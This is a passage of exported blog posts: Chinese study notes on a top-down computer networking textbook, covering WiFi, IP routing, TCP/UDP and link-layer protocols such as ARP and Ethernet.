比特差错率BER:在无线链路的特性决定了传输的数据容易出现比特差错,BER用于衡量这一参数 隐藏终端问题:基站是需要多路访问协议即MAC协议来控制多个无线主机向此基站发送的数据,通常采用CSMA(码多分址),其原理已经介绍过了,主要就是将每一个比特乘以一个特殊的编码在接收端再次解码,通过不同的无线站点分配不同的编码以解决碰撞的问题.原理如下图: 而无线链路的情况不同于有线链路,它很有可能是检测不到其他无线主机正在想基站发送数据的,比如其中一台无线主机被大山挡住,导致另一台主机不能接收到此主机正在发送数据的信号,再比如说,随着位置的增加,可能会有基站可以接受到两台无线主机信号而两台无线主机之间不能接受到彼此的信号的情况.这就被称为隐藏终端问题.如下图: 三、Wifi(802.11无线LAN)3.1、分类无线网络所使用的WiFi协议有许多种,他们分别有不同的频率范围和传输速度,如以下三种协议 3.2、组成无线网络主要由两部分组成,一是基本服务集BSS,包括无线站点和接入点AP,他们都具有唯一的MAC地址,二是分组交换机,BSS就是通过分组交换机与因特网连接.如下图: 3.3、信道与关联那么无线站点是如何通过上图中的体系结构连接如互联网的呢?每个基本服务集BSS都拥有一个SSID,用于唯一标识,WiFi协议信道的频率可以分为11个部分,他们互相之间有重叠,只有1,6,11号信道之间是完全没有重叠的,所以可以在一个物理网络中使用三个信道,每个基站都有自己的信号范围,那么我们定义WiFi丛林的概念,即无线站点在任意物质可以接收到多个基站所发出的信号,那么在这种情况之下,无线站点如何同基站关联的?主要有两种方法: 被动扫描:每个接入点AP都会周期性的发送信标帧,信标帧中包括该AP的SSID和MAC地址,无线站点为了关联AP,就会扫描11 个信道,然后选择一个与之关联 主动扫描:无线主机会向所有在其范围内的AP广播探测帧,AP接收到探测帧后会发送探测响应帧给无线站点,然后无线站点和AP关联 3.4、MAC协议我们在无线链路可能会遇到的问题中已经描述过隐藏终端问题,WiFi有时如何解决碰撞和处理隐藏终端问题的呢? WiFi所使用的MAC协议叫做CSMA/CA,CSMA即是载波侦听,其原理同以前讲述的一样,他会检测其他无线站点是否正在发送数据,如果是则停止传输,知道信道空闲.但是和以前不同的是,CA是碰撞避免,而不是CD碰转检测,因为CD完全不适用于无线链路,其一,两个无线站点之间如果需要互相检测到对方的发送信号所需的成本太大,其二,即使可以互相检测到信号,也会因为隐藏终端问题导致大量的重传. 碰撞避免CA的原理是: 在发送信号之前,即侦听到信道空闲时,会在一个分布式帧间间隔DIFS的短时间后发送数据帧. 若信道繁忙,会选取一个随机回退值,每当侦听到信道空闲时此回退值就会减小,信道繁忙则会冻结回退值,当回退值为0时,发送数据帧 发送数据帧并等待确认,目的地则会在等待一个被称为短帧间间隔SIFS的短时间后发送确认帧. 如果源收到确认帧,表示被正确接收了,需要发送其他帧会从第二部开始.如果未收到确认,进入第二部的回退阶段,并从更大的范围选取回退值 而为了解决隐藏终端问题,在上述的基础上,源会在传输数据帧之前发送一个请求发送控制帧RTS,其中包含了此次传输需要的总时间,目的地在接收到RTS后等待SIFS的短时间,会广播一个允许发送控制帧CTS,CTS的目的是给发送方明确的发送许可及禁止其他无线站点在预约的时间内发送数据帧,但是这种处理方式会消耗信道资源,所以只有需要交换长数据时才会使用. 3.5、帧结构802.11协议(WiFi)所使用的帧的结构如下图所示: 帧控制:包含许多子字段,类型和子类型用于区分管理,RTS,CTS,ACK和数据帧,WEP用于知识是否加密,to,from定义不同地址字段的含义等等,不做具体描述 持续期:表示预约信道的时间,即在上文中描述的如何处理隐藏终端问题的预约时间 地址一:源MAC地址 地址二:接收该帧的设备的MAC地址 地址三:AP所连的交换机的MAC地址,是基本服务集BSS和因特网连接的关键 序号控制:用于区分帧的重传和新的发送 地址四:用于自组织间的MAC地址 有效载荷:存放数据 CRC:循环冗余检测字段 3.6、高级特色 802.11协议可以实现一些高级的功能,比如速率适应,无线站点会要求越来越多的带宽,知道接入点AP说”够了”,功率管理可以让无线 站点向接入点AP发送一个帧以设置一个定时器,无线站点进入睡眠模式,知道接入点在发送下一个信标帧时,唤醒该节点. 四、蜂窝因特网4.1、2G以下是2G网络的组成,统称为GSM蜂窝网体系: 基站控制器BSC:连接几十个基站,执行寻呼,移动用户的切换 移动交换中心MSC:用于用户鉴别和账户管理,一级呼叫建立和切换 网关MSC:与更大的网络相连4.2、3G在2G的基础上,将BSC换为了RNC,并添加了一些新设备 五、802.15协议除了WiFi和蜂窝网络之外,还有其他的无线网络,这里只做极其简单的介绍, 蓝牙:使用802.15.1协议,以TDM方式工作于无需2.4GHz无线电波段,存在主设备和从设备之分,使用自组织模式,形成一个皮可网. ZigBee:多个简化功能设备在单个全功能设备控制下运行. 最后给一张思维导图","link":"2019/03/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B-%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%92%8C%E7%A7%BB%E5%8A%A8%E7%BD%91%E7%BB%9C/"},{"title":"计算机网络自顶向下-网络层","text":"网络层提供的服务网络层提供主机到主机的通信服务。 一、转发和路由选择区别：转发是将分组从一个输入链路接口转移到适当的输出链路接口的路由器本地动作。路由选择是网络范围的过程，决定分组从源到目的地所采取的端到端路径。考虑旅行者从宾夕法尼亚州到佛罗里达州的行程，转发就类似于图中要经过很多立交桥，离开每个立交桥的时候才决定走哪一条路，而路由选择像出发前旅行者就看地图在许多可能的路径(每条路径包含多个立交桥)中选择一条路线。 二、虚电路和数据报网络目前所有网络层不同时提供两种不同服务，在网络层提供连接服务被称为虚电路（VC）网络，在网络层提供无连接服务的计算机网络称为数据报网络。 虚电路：属于一条虚电路的分组将在首部携带一个VC号，因为一条虚电路在每条链路上可能具有不同的VC号，每台中间路由器必须用一个新的VC号来替代每个传输分组的VC号。新VC号从转发表获得。无论何时跨越一台路由器创建一条新的虚电路，转发表就增加了一个新表项。类似地，无论何时终止一条虚电路，沿着该途径每个表中的相应项将被删除。 数据报网络:在数据报网络中，每台路由器由一个将目的地址映射到链路接口的转发表，当分组到达路由器时，路由器使用该分组的目的底子好在转发表中查找适当的输出链路接口。然后路由器有意将分组向该输出链路接口转发。 三、路由器的工作原理一台路由器的输入端口，输出端口和交换结构与共同实现了这种转发功能，而且总是用硬件实现。这些转发功能有时总称为路由器转发平面。 路由器的组成部分输入端口： 执行将一条输入的物理链路与路由器相连接的物理层功能 执行与位于入链路远端的数据链路层交互的数据链路层功能 查找功能，查询转发表决定路由器的输出端口，将分组转发到输出端口交换结构 将路由器的输入端口与输出端口相连 分组通过交换结构转发到输出端口输出端口 存储从交换结构接收的分组，执行必要的链路层和物理层功能在输入链路上传输这些分组。 当链路是双向的时，输出端口与输入端口在同一线路卡成对出现路由选择处理器 执行路由选择协议 维护路由选择表、连接的链路状态信息，为路由器计算转发表 网络管理路由转发平面 一台路由器的输入端口、输出端口和交换结构共同实现了转发功能，并且用硬件实现（软件太慢，需以纳秒时间尺度运行）路由控制平面 路由器的控制功能（执行路由选择协议、对上线或者下线链路进行响应、管理功能），在毫秒时间尺度上运行，用软件实现并在选择处理器上执行（一种cpu） 三种交换模式经内存交换一个分组到达输入端口时，该端口会先通过中断方式向路由选择处理器发出信号分组从输入端口复制到处理器内存中（现代路由器查找交换进内存，是由输入线路卡处理的）早期路由选择处理器从首部提取目的地址，在转发表查找输出端口，将分组复制到输出端口 经总线交换输入端口经一根共享总线将分组直接传送到输出端口，无需路由选择处理器的干预路由器的交换带宽受总线速率限制 经互联网络交换纵横式交换机，2N条总线组成网络，连接N各输入端口和N个输出端口每条垂直的总线与每条水平的总线交叉，交叉点通过交换结构控制器开启闭合某分组到达端口A，需要转发到Y，交换机控制器闭合总线A和Y的交叉点，A在其总线上发送分组，仅由Y接收；同时B也能发分组到X，因为没有公用总线。纵横式网络能并行转发多个分组 四、网际协议（IP）：因特网中的转发和编址网络层三个组件 IP协议 路由选择协议 控制报文协议（ICMP）：报告数据报中的差错、对某些网络层信息请求进行响应的设施IP数据报格式分析 版本号（IPv4、IPv6）：不同版本对数据报不同解释 首部长度：数据报可包含可变数量的选项。不过大部分没有，首部固定20字节 服务类型：区分不同类型的IP数据报 数据报长度：首部+数据的长度。该字段16bit，然而一般数据报很少超过1500字节标识、标志、片偏移：IP分片相关。不过IPv6不允许在路由器上对分组分片 寿命TTL：确保数据报不会永远在网络中循环。每被一个路由器处理时，值-1。若值减到0，丢弃数据报 协议号：到达最终目的地才有用，指示了IP数据报的数据部分应该交给哪个运输层协议。如6交给TCP，如17交给UDP 协议号是将网络层与运输层绑定到一起的粘合剂；端口号是将运输层和应用层绑定的粘合剂 首部检验和：帮忙路由器检测收到IP数据报中首部的比特错误，有错一般丢弃 源和目的IP地址：源主机通过DNS查找目的地址 选项：IPv6已抛弃选项字段 数据（有效载荷）：包含运输层报文段（TCP或UDP），或ICMP报文段一个IP数据报有长为20的首部，如果数据报承载一个TCP报文段，则每个无分片数据报承载总长40的首部（还有TCP的20）以及应用层报文 IP数据报分片因为不是所有的链路层协议都能承载相同长度的网络层分组。比如以太网帧的MTU(Maximum Transmission)即最大传送单元(一个链路层帧能承载的最大数据量)为1500字节。链路层的MTU严格限制IP数据报的长度。因此要进行分片，将IP数据报中的数据分片成多个较小的IP数据报(fragment)再分别用链路层帧封装。 e.g. 一个4000字节的数据报(20字节IP首部加上3980字节IP有效载荷)到达一台路由器，且必须被转发到一条MTU为1500字节的链路上。问要分多少片？每片多少字节？解答： 3980/1500 = 2.65 &lt; 3 则应该分为3片，数据字段分别长1480, 1480, 1020 (3980-1480-1480)注意！分片除了最后一片，所有数据字段长应该是8的倍数！偏移值应当被规定以8字节块为单位！ 分类的IP地址 — 最基本的编址方法 A类地址可指派的网络号是126即：$2^{7}-2$个.(减去全0和全1两种情况)。最大主机数 $2^{24}-2$个。(减去主机号全0和全1) B类地址可指派的网络号是16383即：$2^{14}-1$个.(没有主机号全0和全1的情况，但是128.0.0.0不指配，最小网络地址128.1.0.0)。最大主机数$2^{16}-2$个。(减去主机号全0和全1) C类地址可指派的网络号是2097151即：$2^{21}-1$个.(没有主机号全0和全1的情况，但是192.0.0.0不指配,最小网络地址192.0.1.0)。最大主机数$2^{8}-2$个。(减去主机号全0和全1) D，E类专用了，一般很少见 划分子网从网络的主机号借用若干位作为子网号。划分子网在内部，因此对外仍是一个网络！子网掩码(network mask)子网的网络地址 = 子网掩码 &amp; IP地址 (相与 and)一张图足以概括。另外，若没有划分子网，也必须有子网掩码，使用默认子网掩码。 五、路由选择算法一种广义分类可将路由选择算法分为 全局式路由选择算法(global routing algorithm)：用完整的、全局性的网络制式计算出从源到目的地之间的最低费用路径。实践中，具有全局状态信息的算法常被称为链路状态(Link State, LS)算法。 分散式路由选择算法(decentralized routing algorithm)：以迭代、分布式的方式计算出最低费用路径。一个常用的算法为距离向量(Distance-Vector, DV)算法。由于过于复杂，需要单独研究 六、自治系统内路由选择 – 内部网关协议6.1、路由选择信息协议(Routing Information Protocol, RIP)使用距离向量算法。 仅和相邻路由器交换信息。 路由器交换的信息时当前本路由器知道的全部信息。 按固定的时间间隔交换路由信息。 刚开始时，到直接相连的网络距离定义为1。每经过一个路由器，跳数加1，跳数为16相当于不可达。事实证明，RIP协议可以较快收敛。缺点是当网络出现故障，要记过比较长的时间才能将信息传送到所有的路由器。 RIP协议使用运输层的用户数据报UDP进行传送。RIP1和RIP2的报文首部相同，路由部分有些不同。 6.2、开放最短路径优先(Open Shortest Path First, OSPF)使用链路状态协议。 向本自治系统中所有路由器发送信息。使洪泛法(flooding)。 发送的信息就是与本路由器相邻的所有路由器的链路状态。 只有当链路状态发生变化时，路由器才向所有路由器用洪泛法发送此消息。 各个路由器频繁的交换链路状态信息，所有的路由器建立一个链路状态数据库，这实际上就是全网的拓扑图。OSPF的更新过程收敛得快。OSPF直接用IP数据报传送。(注意RIP是用UDP的) 6.3、外部网关协议BGPBGP采用路径向量(path vector)路由选择协议。协议交换路由信息节点数量级是自治系统个数的数量级。刚开始运行时，BGP的邻站是交换整个的BGP路由表。但以后只需要在发生变化时更新有变化的部分。 七、广播与多播路由选择7.1、 广播路由选择算法N次单播给定N个目的节点，源结点产生该分组的N份副本，对不同目的地每个副本编址，用单播路由选择传送效率低，多份独立的副本会重复经过某段链路，让网络结点本身生成分组副本更有效 无控制洪泛源节点向所有邻居发送分组副本，结点复制该分组并向它邻居转发图中有环，会无休止循环当一个结点与两个以上结点连接时，它将生成并转发广播分组的多个副本，副本中的每个又产生多个副本，产生广播风暴，使网络变得毫无用处 受控洪泛序号控制洪泛：源节点将其地址或其他唯一标识和广播序号放入广播分组，每个结点维护源地址和序号列表反向路径转发RPF：仅当分组到达的链路正好位于它自己返回源的最短单薄路径上，才传输报文，否则丢弃 生成树广播构造最小生成树；结点只需知道哪些邻居在生成树中分布式生成树算法基于中心的方法：建立一棵生成树时，定义一个中心结点（汇合点、核），结点向中心结点单薄加入树的报文。加入树的报文使用单播路由选择朝着中心结点进发，直到它到达一个生成树中，经过的路径再嫁接到现有生成树中 7.2、多播一些新兴应用要求将分组从一个或多个发送方交付给一组接收方，比如各种直播、游戏多播数据报使用间接地址来编址。每个分组难道携带所有接收方IP地址？这不科学用一个标识表示一组接收方（D类多播地址），接收方小组称为多播组 因特网组管理协议IGMPIGMP + 多播路由选择协议 组成网络层多播 第一阶段：当某个主机加入新的多播组时，该主机应向多播组的多播地址发送IGMP 报文，声明自己要成为该组的成员。本地的多播路由器收到 IGMP 报文后，将组成员关系转发给因特网上的其他多播路由器。 第二阶段：因为组成员关系是动态的，因此本地多播路由器要周期性地探询本地局域网上的主机，以便知道这些主机是否还继续是组的成员。只要对某个组有一个主机响应，那么多播路由器就认为这个组是活跃的。但一个组在经过几次的探询后仍然没有一个主机响应，则不再将该组的成员关系转发给其他的多播路由器。","link":"2019/03/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B-%E7%BD%91%E7%BB%9C%E5%B1%82/"},{"title":"计算机网络自顶向下-运输层","text":"一、运输层提供的服务运输层为运行在不同主机上的应用进程之间提供逻辑通信功能。应用进程使用运输层提供的逻辑通信功能彼此发送报文，而无需考虑承载这些报文的物理基础。、运输层和网络层的关系：网络层提供了主机之间的逻辑通信，运输层为在不同主机上的进程之间提供了逻辑通信。运输层协议只在主机起作用，运输层能够提供的服务受制于网络层协议的服务模型。 二、多路复用和多路分解将运输层报文段中的数据交付到正确的套接字的工作成为多路分解。源主机从不同的套接字接收数据块，并为每个数据块封装上首部信息形成报文段，并将报文段传到网络的过程叫做多路复用。 多路复用要求：（1）套接字有唯一标识符（2）每个报文段有特殊字段来指示该报文段要交付到的套接字。特殊字段是指端口号。端口号是一个16比特数，0-1023为固定端口号，如HTTP（80端口）、FTP（21端口）。 三、UDP协议（无连接运输）（8字节首部）3.1、UDP的优势：（1）实时性较强，TCP由于其拥塞控制实时性较弱（2）无需建立连接，没有建立连接的时延，因此DNS运行在UDP上，HTTP运行在TCP上（3）无连接状态，TCP需要在端系统中维护连接状态，包括接收和发送的缓存、拥塞控制参数以及序号与确认号的参数（4）分组首部开销小。常见应用及其运输协议： 应用 应用层协议 运输层协议 电子邮件 SMTP TCP 远程终端访问 Telnet TCP Web HTTP TCP 文件传输 FTP TCP 远程文件服务器 NFS UDP 流式多媒体 通常专用 UDP或TCP 因特网电话 通常专用 UDP或TCP 网络管理 SNMP UDP 路由选择协议 RIP UDP 名字转换 DNS UDP 3.2、UDP检验和：差错检测功能发送方的UDP对报文段中的所有16比特字的和进行反码运算，求和时遇到的任何溢出都被回卷（溢出后加到最后一位）。然后将该结果取反码作为检验和。在接收端，如果没有出错，所有数据和检验和相加的结果为1111111111111111。可以自己抓个包，自己静下来算一下，保证爽死你。 四、可靠数据传输原理可靠数据传输协议往往建立在不可靠IP网络层协议之上。 4.1、构造可靠数据传输协议1、经完全可靠信道的可靠数据传输：rdt 1.0最简答的情况，底层信号完全可靠，然而这在实际中不能实现 2、经具有比特差错信道的可靠数据传输：rdt 2.0假设所有发送的分组都可以按其发送顺序被接收。基于重传机制的可靠数据传输协议称为自动重传请求协议（ARQ）。ARQ协议中还需要另外三种协议功能来处理存在比特差错的情况：差错检测，接收方反馈，重传。rdt2.0的发送端每发送一个分组需要等待接收端的确认信号，这种协议被称为停等协议。这种协议的一个关键问题是没有考虑确认信号受损的情况。解决这一问题的方法是在数据分组中添加一个新字段，让发送方对其数据分组编号，即序号的概念。此为rdt2.1。rdt2.2时在rdt2.1的基础上实现了一个没有否定确认的可靠传输协议。 3、经具有比特差错的丢包信道的可靠数据传输：rdt3.0检测丢包的方法：倒计数定时器用于实现基于时间的重传机制。总结可靠传输需要的技术：检验和、序号、定时器、肯定和否定确认分组。 4.2、流水线可靠数据传输协议rdt3.0的最大缺陷在于它是一个停等协议。因此诞生流水线概念，发送端不需要等待确认信号就可以发送下一个分组。但会带来如下影响：必须增加序号范围；协议双方必须缓存多个分组；序号范围和缓存大小取决于数据传输协议如何处理丢失、损坏及延时过大的分组。有两种基本方法：回退N步和选择重传（1）回退N步（GBN）：允许发送端发送多个分组，但在流水线中未被确认的分组数不能大于N，N被称为窗口长度，GBN协议也被称为滑动窗口协议。如果出现超时，发送方会重传所有已发送但未被确认的分组，即回退N步，从而保证接收端可以按序将数据交付给上层。（2）选择重传（SR）：GBN中单个分组的错误会引起重传大量分组。选择重传协议通过让发送端仅重传那些它怀疑在接收方出错的分组。 SR中发送端和接收端的序列空间：SR协议会产生接收方不能确定新到的分组是一个新的分组还是一次重传，因此要求窗口长度必须小于或等于序号空间大小的一半。 (PS：其实意思就是当我回复我收到了第五个包，根据前面的协议，我虽然说的是第五个，但是前4个包我都已经收到了，所以现在你就不必纠结于第四个包是不是丢了我收没收到，其实你可以放心直接去发第六个包，不知道合不合理，逃ε=ε=ε=┏(゜ロ゜;)┛)五、TCP协议（面向连接的运输）（20字节首部）TCP之所谓是面向连接的，是因为两个进程间通信前要先相互握手，且TCP提供全双工服务。TCP连接的组成包括：客户端主机上的缓存、变量和套接字，服务端上的缓存、变量和套接字。 5.1、TCP报文段结构 源端口和目的端口，各占两个字节； 序号seq，4个字节，TCP传送的字节流中每个字节都要编号； 确认号ack，4个字节，期望发送方下一个报文的第一个数据字节的序号； 2个字节的接收窗口字段，用于流量控制； 4比特的首部长度，通常为空； 可选与变长的选项字段，用于发送方和接收方协商最大报文段长度时，或在高速网络环境下用于窗口调节因子使用； 6比特的标志字段：紧急URG，表明此报文中有紧急数据，紧急数据的最后一个字节的指针由紧急指针指出；确认ACK，表明该报文段为已成功接收报文段的确认；PSH=1时，表明接收方应立即将数据报交给上层；复位RST，当RST=1时，表明TCP连接出现错误，必须释放连接；同步SYN，在建立连接时用来同步序号。当SYN=1，ACK=0时表明是连接请求报文；响应报文为SYN=1，ACK=1；终止FIN，用来释放连接； 序号和确认号：TCP把数据看做有序无结构的字节流，用序号对每个传输的字节进行编号。由于TCP是全双工服务，在主机A向主机B发送报文的同时A也会接收B发送的报文，确认号则是接收方希望发送方发送的下一字节的序号。例如A已收到B发送的序号为0-535的所有字节，则A会在发给B的报文段的确认号中填入536。如果A在收到536-899之前收到900-1000，则确认号仍为536，这叫TCP的累积确认。 5.2、抓包分析 5.3、可靠数据传输TCP的定时器管理过程只使用单一的重传定时器。 首先给出TCP高度简化的描述：发送方只用超时来恢复报文段的丢失。发送方有3个与发送和重传有关的事件：（1）TCP从应用程序接收数据，并编号交给IP，若定时器未启动则启动定时器（2）超时，则重传超时的报文段，并重启定时器（3）收到确认，采用累积确认，，所以当前确认号之前的所有报文段都已被接收，若仍有未确认的报文段，重启定时器。累积确认详见书图3.36。 超时间隔加倍：TCP每次重传都会将下一次超时间隔设为当前值的两倍，而不是通过EstimatedRTT设置。这是一种简单的拥塞控制。 快速重传：超时间隔加倍会增加端到端时延。而由于接收端累积确认，在未收到期望序号报文段时会不断的发送相同的ACK确认号，此为冗余ACK。当接收端收到3个冗余ACK时，TCP就执行快速重传，在定时器过期前重传丢失的报文段。 5.4 流量控制TCP为其应用程序提供流量控制服务以消除发送方使接收方缓存溢出的可能性。TCP的流量控制通过接收窗口来实现，用于给发送方表明接收方还有多少可用的缓存空间。接收窗口用rwnd表示，有一个情况：A向B通信，当B缓存满了的时候，他返回的报文段中rwnd=0，如果B的应用程序将缓存清空了，同时B没有数据要向A发送，则A不能知道B的缓存清空。TCP规定在rwnd=0时A继续发送一个字节数据的报文段。 5.5、三次握手，四次挥手三次握手：为什么是3次握手？ 1、主要是为了防止已经失效的连接请求报文突然又传送到了服务器，从而产生错误连接。2、改为两次握手可能产生死锁。假设A向B发送请求，B收到请求后发送确认信号。此时如果按照两次握手协议，连接已建立，B开始传输数据。然后如果B的确认信号A没有接受到，A将不能知道B的序列号，将无法接受B的数据。而B在发送数据超时后会重复发送数据，从而死锁。为什么要客户端要等待2MSL（报文最大生存时间）？ 1、保证客户端发送的最后一个ACK报文能够到达服务器。2、如果客户端直接进入closed状态，而服务端还有数据在网络中，当有一个新连接的端口和服务端端口一样时，那么客户端会认为这些数据是新连接的。 当主机接收到一个TCP报文段，其端口号或源IP地址与该主机上进行中的套接字都不匹配，此时主机会向源发送一个特殊的重置报文段，其RST标志位置1. 六、拥塞控制拥塞控制的方法：（1）端到端拥塞控制，网络层并没有为运输层的拥塞控制提供支持，TCP运用的方式，只能推断是否发生拥塞。（2）网络辅助的拥塞控制，路由器可以向发送端反馈网络的拥塞情况，但还未被用于TCP中。 6.1、 TCP拥塞控制（加性增、乘性减（AIMD）拥塞控制方法）TCP采用的方法是让每一个发送方根据所感知到的网络拥塞程度来限制其能向连接发送流量的速率。如何调整发送方的发送速率：在发送方跟踪一个变量，即拥塞窗口（cwnd），其对一个TCP发送方能向网络中发送流量的速率进行了限制（发送方中未被确认的数据量不超过cwnd和rwnd的最小值）。如何感知拥塞：通过出现超时或3次冗余ACK来确认是否发生拥塞。TCP发送方能够以更高的速率发送而不会使网络拥塞，有三个原则：（1）一个丢失的报文段意味拥塞，此时应降低TCP发送方速率（减小cwnd的大小）。（2）一个确认报文段指示网络正在向接收方交付发送方的报文段，此时可以增加发送方的速率。（3）带宽探测 6.2、TCP拥塞控制算法：慢启动，拥塞避免，快速恢复（1）慢启动 当TCP连接开始时，cwnd的值置为1个MSS（最大报文段长度），每当传输的报文段首次被确认就增加1个MSS，因此cwnd以指数增长。 指数增长的结束方案：（1）如果出现超时的丢包事件，将慢启动阈值ssthresh置为cwnd/2，并将cwnd重新置为1并重新开始慢启动。（2）当新的cwnd增长到超过ssthresh时，结束慢启动进入拥塞避免模式。（3）如果检测到3个冗余ACK则进入快速恢复状态。 （2）拥塞避免 每个RTT（往返时间）只增加一个MSS。假设当前MSS为1460字节而cwnd为14600字节，则一个RTT发送10个报文段，每到达一个ACK增加MSS/10的拥塞窗口长度，当收到10个报文段的所有ACK时增则会增加1个MSS。 当出现超时时，将ssthresh置为cwnd/2，同时将cwnd置为1，开始慢启动。当出现3次冗余ACK时，表示当前网络仍可以交付，TCP将ssthresh置为cwnd/2，同时cwnd=cwnd/2+3MSS，并进入快速恢复。 （3）快速恢复 在快速恢复中，对于引起TCP进入快速恢复状态的缺失报文段，每收到一个它的冗余ACK就将cwnd增加一个MSS。当收到丢失报文段的ACK时，cwnd=ssthresh，并进入拥塞避免。如果在这个阶段超时，同样进入慢启动。公平性：在K条TCP连接经过传输速率为R的链路时，如果每条连接的平均传输速率接近R/K，则认为该拥塞控制是公平的。在每条TCP连接的RTT相等的情况下，上述TCP拥塞控制是公平的（详见图3.56），但实际中RTT小的连接会有更高的吞吐量。","link":"2019/03/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B-%E8%BF%90%E8%BE%93%E5%B1%82/"},{"title":"计算机网络自顶向下-链路层","text":"一、链路层提供的服务1、成帧。在每个网络层数据报经链路传送之前，几乎所有链路层协议都要将其用链路层帧封装起来。2、链路接入。媒体访问控制(Medium Access Control, MAC)协议规定了帧在链路上传输的规则。3、可靠交付。保证无差错地经链路层移动每个网络层数据报。4、差错检测和纠正。当帧中的一个比特作为1传输时，接收方结点中的链路层硬件可能不正确地将其判断为0，反之亦然。这种比特差错是由信号衰减和电磁噪声导致的。 二、差错检测和纠正技术差错检测和纠错技术越复杂，导致的开销就越大，这就是意味着需要更多的计算量及更多的差错检测和纠错比特。 2.1、三种检测差错的技术： 奇偶校验（一维奇偶校验十分简单，但未检出差错的几率较高；二维奇偶校验可检测差错，还可以纠正差错） 检验和方法（与运输层的检验和方法类似） 循环冗余检测(Cyclic Redundancy Check, CRC) 2.2、两种类型的网络链路1、点对点链路。由链路一端的单个发送方和链路另一端的单个接收方组成。许多链路层协议都为点对点链路设计，如点对点协议(point-to-point protocol, PPP)和高级数据链路控制(high-level data link control, HDLC)协议。2、广播链路。能够让多个发送和接收结点都连接到相同的、单一的、共享的广播信道上。广播信道通常用于局域网中。 三、多路访问问题协调多个发送/接收点对一个共享广播信道的访问，避免碰撞，有如下几种协议：    （1）信道划分协议：时分、频分、码分等，采用时分多路复用(TDM)和频分多路复用(FDM)    （2）随机接入协议：碰撞后，重发该帧前等待一个随机时延，有以下几种(时隙ALOHA,ALOHA,载波侦听多路访问(CSMA)具有碰撞检测的载波侦听多路访问(CSMA/CD))    例如CSMA载波侦听多路访问协议，节点在传播前先侦听信道，直到检测到一小段时间内没有信号传输，然后再开始传输，如果检测到碰撞就停止传输，继续侦听。    （3）轮流协议：【1】轮询协议，有一个主节点，轮询每个节点    【2】令牌传递协议，无主节点1、信道划分协议。采用时分多路复用(TDM)和频分多路复用(FDM)，在所有共享信道的结点之间划分广播信道带宽的技术。2、随机接入协议。一个传输结点总是以信道的全部速率进行发送、当有碰撞时，涉及碰撞的每个结点反复地重发它的帧(也就是分组)，到该帧无碰撞地通过为止。在重发涉及碰撞的帧之前，会等待一个随机时延。涉及碰撞的每个结点独立地选择随机时延。随机接入协议又有以下几种： 四、链路层地址为什么我们在网络层和链路层都需要地址呢？ 局域网是为任意网络层协议而设计，而不只是用于IP和因特网。 如果适配器使用网络层地址而不是MAC地址，网络层地址必须存储在适配器的RAM中，并且在每次适配器移动(或加电)时要重新配置。 主机和路由器中的适配器(即网络接口)具有链路层地址。要注意的是，链路层交换机没有链路层地址，因为它的任务是在主机与路由器之间承载数据报，它透明地执行该项任务，主机或路由器不必明确地将帧寻址到其间的交换机。链路层地址有几种不同的称呼：1、LAN地址2、物理地址3、MAC地址大多数局域网，MAC地址长度为6字节。尽管MAC地址被设计为永久，但可以做到用软件改变一块适配器的MAC地址。没有两块适配器具有相同的MAC地址。 4.1、地址解析协议(Address Resolution Protocol, ARP)ARP将一个IP地址解析为一个MAC地址。在很多方面它和DNS类似，DNS将主机名解析为IP地址。它们之间的重要区别是：DNS为在因特网中任何地方的主机解析主机名，而ARP只为在同一个子网上的主机和路由器接口解析IP地址。每台主机或路由器在其内存中有一个ARP表，包含IP地址到MAC地址的映射关系。如果一台主机要发送一个数据报到子网中的另一台主机，发送方需要获得给定IP地址的目的主机的MAC地址，如果发送方ARP表具有该目的结点的表项，这个任务很容易完成了如果没有，发送方会向它的适配器传递一个ARP查询分组，并且指示适配器应该用MAC广播地址(即FF-FF-FF-FF-FF-FF)来发送这个分组。 ARP协议需要注意的两件事1、查询ARP报文是在广播帧中发送的，而响应ARP报文在一个标准帧中发送2、ARP是即插即用的，意思是一个ARP表是自动建立的，它不需要系统管理员来配置。并且如果某主机与子网断开连接，它的表项最终会从留在子网中的结点的表中删除掉。 4.2、以太网以太网帧结构 前同步码(8字节)。前同步码的前7个字节值都为10101010，最后一个字节为10101011。前7个字节用于“唤醒”接收适配器，并且将它们的时钟和发送方的时钟同步。 目的地址(6字节)。目的适配器的MAC地址。 源地址(6字节)。源适配器的MAC地址。 类型(2字节)。该字段允许以太网复用多种网络层协议。要记住主机能够使用除了IP以外的其他网络层协议。 数据(46~1500字节)。承载IP数据报。以太网最大传输单元(MTU)为1500字节，如果超过1500字节，主机必须将该数据报分片。数据字段的最小长度为46字节，少于则被填充到46字节。 CRC(4字节)。循环冗余检测字段，检测帧是否引入了差错。所以以太网技术都向网络层提供无连接服务。即适配器A向适配器B发送数据报时不需要先与适配器B“握手”。这种无连接服务类似于IP的第三层数据报服务和UDP的第四层无连接服务。 4.3、链路层交换机交换机的过滤和转发1、过滤是决定一个帧应该转发到某个接口还是应当将其丢弃2、转发是决定一个帧应该被导向哪个接口，并把该帧移动到那些接口 链路层交换机的过滤和转发功能借助于交换机表。转发分组基于MAC地址。 4.4、链路层交换机的自学习1、交换机表初始为空2、当在每个接口接收到的每个入帧，该交换机在其表中存储：（1）在该帧源地址字段中的MAC地址（2）该帧到达的接口（3）当前时间。3、如果在一段时间内，交换机没有接收到以该地址作为源地址的帧，就在表中删除这个地址。链路层交换机是全双工的，任何交换机接口能够同时发送和接收。 